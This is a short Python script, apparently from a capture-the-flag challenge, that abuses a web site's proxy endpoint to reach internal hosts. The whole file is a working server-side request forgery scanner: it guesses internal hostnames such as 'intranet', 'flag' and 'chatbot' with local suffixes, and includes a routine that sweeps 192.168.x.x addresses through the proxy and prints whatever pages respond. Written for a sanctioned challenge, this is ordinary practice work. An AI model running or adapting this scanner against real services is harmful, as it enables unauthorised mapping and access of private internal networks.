#!/usr/bin/python3

import sys
from multiprocessing import Pool
import requests
import time

def checkUrl(url):
    try:
        r = requests.get('https://challengecybersec.fr/b34658e7f6221024f8d18a7f0d3497e4/proxy?url=%s' % url)
        if(r.status_code == requests.codes.ok):
            print('Find url %s with content %s' % (url,r.text))
            sys.exit(0)
    except:
        return (url, 'skipped due to error')
    return (url, r.status_code)

def checkIp(network,ip):
    url = 'https://192.168.%d.%d/' % (network,ip)
    return checkUrl(url)

def checkSubnet(network):
    for i  in range(256):
            r = checkIp(network,i)
            print("%s\t%s" % (r[0], r[1]))
            time.sleep(1)

def main():
    work = ["network", "intra", "intranet","flag", "web", "chatbot", "bot", "chat"]
    suffix = ['', '.intra', '.local', '.lan', '.intranet']
    proto = ['https', 'http']
    for p in proto:
        for u in work:
            for s in suffix:
                print("%s\t%s" % checkUrl("%s://%s%s" % (p,u,s)))
#    work = [i for i in range(0,50)]
#    with Pool(10) as p:
#        p.map(checkIp, work)

if __name__ == '__main__':
    main()

